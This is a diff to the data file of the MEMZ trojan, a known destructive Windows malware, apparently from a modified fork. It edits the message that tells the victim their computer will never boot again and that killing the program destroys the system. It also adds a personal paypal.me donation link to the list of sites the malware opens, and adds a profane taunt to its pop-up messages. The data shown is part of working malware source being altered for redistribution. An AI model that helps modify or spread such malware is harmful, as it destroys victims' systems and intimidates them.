@@ -1,7 +1,7 @@
 #include "data.h"
 
 #ifndef CLEAN
-const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D";
+const unsigned char msg[] = "YOUR COMPUTER HAS BEEN FUCKED BY THE MEMZ TROJAN.\r\n\r\nYour computer won't boot up again,\r\nso use it as long as you can if you can!\r\n\r\n:D\r\n\r\nTrying to kill MEMZ will cause your system to be\r\ndestroyed instantly, so don't try it :D";
 #endif
 
 const char *sites[] = {
@@ -34,6 +34,7 @@ const char *sites[] = {
 	"http://google.co.ck/search?q=john+cena+midi+legit+not+converted",
 	"http://google.co.ck/search?q=vinesauce+meme+collection",
 	"http://google.co.ck/search?q=skrillex+scay+onster+an+nice+sprites+midi",
+	"http://paypal.me/TomCreeper",
 	"http://answers.microsoft.com/en-us/protect/forum/protect_other-protect_scanning/memz-malwarevirus-trojan-completely-destroying/268bc1c2-39f4-42f8-90c2-597a673b6b45",
 	"http://motherboard.vice.com/read/watch-this-malware-turn-a-computer-into-a-digital-hellscape",
 	"http://play.clubpenguin.com",
@@ -76,6 +77,7 @@ const char *msgs[] = {
 	"SOMEBODY ONCE TOLD ME THE MEMZ ARE GONNA ROLL ME",
 	"Why did you even tried to kill MEMZ?\r\nYour PC is fucked anyway.",
 	"SecureBoot sucks.",
+	"FUCK YOU!",
 	"gr8 m8 i r8 8/8",
 	"Have you tried turning it off and on again?",
 	"<Insert Joel quote here>",
